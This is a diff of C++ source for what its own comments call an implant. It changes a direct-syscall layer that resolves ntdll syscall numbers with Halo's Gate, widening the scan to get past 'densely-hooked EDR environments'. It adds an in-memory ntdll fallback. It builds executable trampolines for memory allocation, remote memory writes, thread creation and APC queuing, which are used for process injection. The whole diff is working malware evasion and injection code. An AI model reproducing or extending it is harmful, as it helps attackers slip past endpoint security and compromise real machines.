@@ -51,16 +51,18 @@ static bool ReadNtdllFromDisk(std::vector<BYTE>& buf) {
 // PE parser — section-aware RVA → file offset
 // ============================================================
 struct NtdllMap {
-    const BYTE*                   data    = nullptr;
-    size_t                        size    = 0;
-    const IMAGE_NT_HEADERS64*     nt      = nullptr;
-    const IMAGE_SECTION_HEADER*   secs    = nullptr;
-    WORD                          numSecs = 0;
+    const BYTE*                   data       = nullptr;
+    size_t                        size       = 0;
+    const IMAGE_NT_HEADERS64*     nt         = nullptr;
+    const IMAGE_SECTION_HEADER*   secs       = nullptr;
+    WORD                          numSecs    = 0;
+    bool                          mapped     = false; // true = in-memory image
 
-    bool Init(const std::vector<BYTE>& buf) {
+    bool Init(const std::vector<BYTE>& buf, bool isMemoryMapped = false) {
         if (buf.size() < sizeof(IMAGE_DOS_HEADER)) return false;
-        data = buf.data();
-        size = buf.size();
+        data   = buf.data();
+        size   = buf.size();
+        mapped = isMemoryMapped;
 
         auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(data);
         if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
@@ -78,6 +80,10 @@ struct NtdllMap {
     }
 
     DWORD Rva2Off(DWORD rva) const {
+        if (mapped) {
+            // In-memory image: RVA is already the offset from the image base
+            return (rva < static_cast<DWORD>(size)) ? rva : 0;
+        }
         for (WORD i = 0; i < numSecs; ++i) {
             DWORD vStart = secs[i].VirtualAddress;
             DWORD vEnd   = vStart + std::max(secs[i].SizeOfRawData,
@@ -192,8 +198,8 @@ static DWORD ResolveSSN(const NtdllMap& m,
         DWORD ssn = ExtractSSN(stub, 32);
         if (ssn != DWORD(-1)) return ssn;
 
-        // Halo's Gate — scan neighbors
-        for (int delta = 1; delta <= 30; ++delta) {
+        // Halo's Gate — scan neighbors; 60 covers densely-hooked EDR environments
+        for (int delta = 1; delta <= 60; ++delta) {
             // Forward neighbor
             if (idx + delta < exports.size()) {
                 DWORD nOff = m.Rva2Off(exports[idx + delta].rva);
@@ -223,11 +229,12 @@ static DWORD ResolveSSN(const NtdllMap& m,
 // ============================================================
 // Build RX trampoline pool for all required syscalls:
 // ============================================================
-static PVOID g_TrampolinePool = nullptr;
+static PVOID  g_TrampolinePool  = nullptr;
 static size_t g_TrampolineCount = 0;
+constexpr size_t MAX_STUBS = 16; // capacity; current RESOLVE calls = 11
+constexpr size_t STUB_LEN  = 11;
 
 static PVOID BuildTrampoline(DWORD ssn) {
-    constexpr size_t STUB_LEN = 11;
     static const BYTE TEMPLATE[STUB_LEN] = {
         0x4C, 0x8B, 0xD1,              // mov r10, rcx
         0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <ssn>
@@ -235,23 +242,20 @@ static PVOID BuildTrampoline(DWORD ssn) {
         0xC3                           // ret
     };
 
-    // First call: allocate pool for all 11 syscalls
     if (!g_TrampolinePool) {
-        g_TrampolinePool = VirtualAlloc(nullptr, STUB_LEN * 11,
+        g_TrampolinePool = VirtualAlloc(nullptr, STUB_LEN * MAX_STUBS,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
         if (!g_TrampolinePool) return nullptr;
     }
+    if (g_TrampolineCount >= MAX_STUBS) return nullptr;
 
     PVOID stubAddr = reinterpret_cast<BYTE*>(g_TrampolinePool) + (g_TrampolineCount * STUB_LEN);
-    
     BYTE stub[STUB_LEN];
     memcpy(stub, TEMPLATE, STUB_LEN);
     *reinterpret_cast<DWORD*>(&stub[4]) = ssn;
-
     memcpy(stubAddr, stub, STUB_LEN);
     g_TrampolineCount++;
-
     return stubAddr;
 }
 
@@ -265,10 +269,32 @@ static VOID FinalizeTrampolinePool() {
 }
 
 // ============================================================
+// In-memory ntdll fallback: if disk read fails, map the already-
+// loaded ntdll as a flat byte view for export parsing.
+// Hooks will still be visible but Halo's Gate handles them.
+// ============================================================
+static bool MapNtdllInMemory(std::vector<BYTE>& buf) {
+    HMODULE h = GetModuleHandleW(L"ntdll.dll");
+    if (!h) return false;
+    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(h);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
+        reinterpret_cast<const BYTE*>(h) + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
+    if (imageSize < 0x1000 || imageSize > 64 * 1024 * 1024) return false;
+    buf.assign(reinterpret_cast<const BYTE*>(h),
+               reinterpret_cast<const BYTE*>(h) + imageSize);
+    // Fix up: in-memory images use VirtualAddress == file offset (mapped)
+    // but our Rva2Off still works because for mapped images the RVAs map
+    // directly to offsets within the captured buffer.
+    return true;
+}
+
+// ============================================================
 // Public entry point
 // ============================================================
 BOOL InitializeSyscalls() {
-    // Free previous pool if retrying — prevents writing past the allocation
     if (g_TrampolinePool) {
         VirtualFree(g_TrampolinePool, 0, MEM_RELEASE);
         g_TrampolinePool  = nullptr;
@@ -277,14 +303,21 @@ BOOL InitializeSyscalls() {
     }
 
     std::vector<BYTE> ntdllBuf;
-    if (!ReadNtdllFromDisk(ntdllBuf)) return FALSE;
+    bool fromDisk = ReadNtdllFromDisk(ntdllBuf);
+    bool memFallback = false;
+    if (!fromDisk) {
+        if (!MapNtdllInMemory(ntdllBuf)) return FALSE;
+        memFallback = true;
+    }
 
     NtdllMap m;
-    if (!m.Init(ntdllBuf)) return FALSE;
+    if (!m.Init(ntdllBuf, memFallback)) return FALSE;
 
     std::vector<ExportSlot> exports;
     if (!BuildExportList(m, exports)) return FALSE;
 
+    // Critical: implant cannot function without these three.
+    // If they fail even with Halo's Gate, give up.
 #define RESOLVE(sym, field)                                      \
     do {                                                         \
         DWORD _ssn = ResolveSSN(m, exports, sym);               \
@@ -295,20 +328,37 @@ BOOL InitializeSyscalls() {
             reinterpret_cast<decltype(g_Syscalls.field)>(_t);   \
     } while (0)
 
+    // Optional: skip silently if SSN can't be found; injection falls back
+    // to Win32 equivalents when these are null.
+#define RESOLVE_OPT(sym, field)                                  \
+    do {                                                         \
+        DWORD _ssn = ResolveSSN(m, exports, sym);               \
+        if (_ssn != DWORD(-1)) {                                 \
+            PVOID _t = BuildTrampoline(_ssn);                    \
+            if (_t)                                              \
+                g_Syscalls.field =                               \
+                    reinterpret_cast<decltype(g_Syscalls.field)>(_t); \
+        }                                                        \
+    } while (0)
+
+    // ── Critical (must resolve) ──────────────────────────────
     RESOLVE("NtAllocateVirtualMemory",  NtAllocateVirtualMemory);
     RESOLVE("NtWriteVirtualMemory",     NtWriteVirtualMemory);
     RESOLVE("NtProtectVirtualMemory",   NtProtectVirtualMemory);
-    RESOLVE("NtCreateThreadEx",         NtCreateThreadEx);
-    RESOLVE("NtOpenProcess",            NtOpenProcess);
-    RESOLVE("NtClose",                  NtClose);
-    RESOLVE("NtQuerySystemInformation", NtQuerySystemInformation);
-    RESOLVE("NtMapViewOfSection",       NtMapViewOfSection);
-    RESOLVE("NtQueueApcThread",         NtQueueApcThread);
-    RESOLVE("NtSuspendThread",          NtSuspendThread);
-    RESOLVE("NtResumeThread",           NtResumeThread);
+
+    // ── Optional (injection / query; null = Win32 fallback) ──
+    RESOLVE_OPT("NtCreateThreadEx",         NtCreateThreadEx);
+    RESOLVE_OPT("NtOpenProcess",            NtOpenProcess);
+    RESOLVE_OPT("NtClose",                  NtClose);
+    RESOLVE_OPT("NtQuerySystemInformation", NtQuerySystemInformation);
+    RESOLVE_OPT("NtMapViewOfSection",       NtMapViewOfSection);
+    RESOLVE_OPT("NtQueueApcThread",         NtQueueApcThread);
+    RESOLVE_OPT("NtSuspendThread",          NtSuspendThread);
+    RESOLVE_OPT("NtResumeThread",           NtResumeThread);
 
     FinalizeTrampolinePool();
 
 #undef RESOLVE
+#undef RESOLVE_OPT
     return TRUE;
 }
